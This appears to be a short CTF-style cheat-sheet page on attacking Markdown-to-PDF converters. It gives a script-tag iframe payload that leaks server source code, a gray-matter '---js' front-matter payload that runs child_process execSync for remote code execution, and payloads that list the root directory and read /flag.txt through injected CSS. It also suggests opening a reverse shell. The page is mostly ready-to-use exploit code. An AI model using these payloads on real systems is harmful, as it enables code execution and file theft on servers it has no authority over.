# Md to Pdf injection

### Table of Contents

- [PDF injection](#pdf-injection)
- [Md-to-Pdf Vunlerability](#md-to-pdf-vulnerability)

## PDF injection

First, try [PDF injection](/web/server-side/pdf-injection.md) to see if the website is exploitable.

```js
<script>document.write('<iframe src="'+window.location.href+'/index.js" width=1000px height=1000px></iframe>')</script>
```

This script can provide /index.js, and let you watch the src code.

## Md-to-pdf Vulnerability

The library gray-matter (used by md-to-pdf to parse front matter) exposes a JS-engine by default, which essentially runs eval on the given Markdown.

exploit: 

```js
---js
((require("child_process")).execSync(""))
---RCE
```

You can open a reverse shell inside the execSync or readdir and file with : 

```js
---js
{
    css: `body::before { content: "${require('fs').readdirSync('/').join()}"; display: block }`,
}
---
```

```js
---js
{
css: `body::before { content: "${require('fs').readFileSync('/flag.txt', 'utf-8')}"; display: block }`
}
---
```

### Documentation

- [Reverse shell tuto](https://www.youtube.com/watch?v=QVaf4DMYPFc)
- [Github Poc vuln](https://github.com/simonhaenisch/md-to-pdf/issues/99)

---

[**:arrow_right_hook: Back home**](/README.md)
